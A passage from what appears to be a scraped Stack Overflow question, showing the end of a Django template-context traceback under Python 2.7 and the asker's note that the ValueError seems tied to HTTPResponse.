\"/home/vagrant/sat/lib/python2.7/site-packages/django/template/context.py\", line 55, in push\n    return ContextDict(self, *args, **kwargs)\n  File \"/home/vagrant/sat/lib/python2.7/site-packages/django/template/context.py\", line 20, in __init__\n    super(ContextDict, self).__init__(*args, **kwargs)\nValueError: dictionary update sequence element #0 has length 5918; 2 is required\n</code></pre>\n\n<p>This error seems specific to HTTPResponse and the other stackoverflow posts aren't helpful</p>\n"}]